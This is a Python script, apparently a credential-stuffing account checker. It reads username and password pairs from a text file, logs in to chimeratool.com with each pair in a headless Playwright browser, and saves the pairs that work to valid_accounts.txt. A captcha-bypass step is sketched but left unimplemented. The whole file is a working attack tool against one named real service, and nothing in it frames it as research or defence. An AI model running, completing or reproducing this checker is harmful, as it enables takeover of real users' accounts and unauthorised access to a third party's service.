from playwright.sync_api import sync_playwright
# import time
# from captcha_bypass import solve_captcha

def parse_login_password(path):
    usernames = []
    passwords = []
    with open(path, 'r') as f:
        login_password = f.read().splitlines()
        for element in login_password:
            if 'USER' in element:
                username = element.split(' ')[1]
                usernames.append(username)
            elif 'PASS' in element:
                password = element.split(' ')[1]
                passwords.append(password)
        
        login_passwords = dict(zip(usernames, passwords))
        return login_passwords

def check_login(username, password):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.goto('https://chimeratool.com/pt/login')
        username_field = page.wait_for_selector('input[name="username"]')
        username_field.fill(username)
        password_field = page.wait_for_selector('input[name="password"]')
        password_field.fill(password)
        login_button = page.wait_for_selector('input[value="Acessar"]')
        login_button.click()

        element = page.get_by_text('Um erro ocorreu:')
        if element.count() > 0:
            print("Error message found, discarding account...")
            return

        element = page.locator('img[id="w0-image"]')
        if element.count() > 0:
            print("Captcha found, solving...")
            #Download Captcha Image
            captcha_img = page.locator('img[id="w0-image"]')
            captcha_img.screenshot(path='captcha.png')
            print("Captcha downloaded...")
            #Solve Captcha -> STILL NEED TO IMPLEMENT
            # solve_captcha('captcha.png')
        else:
            print("No Captcha, proceeding...")
        
        element = page.locator('span[id="headerUserName"]')
        if element.count() > 0:
            print("Logged in as " + page.text_content('span[id="headerUserName"]'))
            browser.close()
            return True
        else:
            print("Not logged in... Account discarded...")
        browser.close()

def main():
    path = 'chimeratool.txt'
    login_passwords = parse_login_password(path)
    valid_accounts = {}
    for username, password in login_passwords.items():
        res = check_login(username, password)
        if res:
            valid_accounts[username] = password

    with open('valid_accounts.txt', 'w+') as f:
        for username, password in valid_accounts.items():
            f.write(username + ':' + password + '\n')

if __name__ == '__main__':
    main()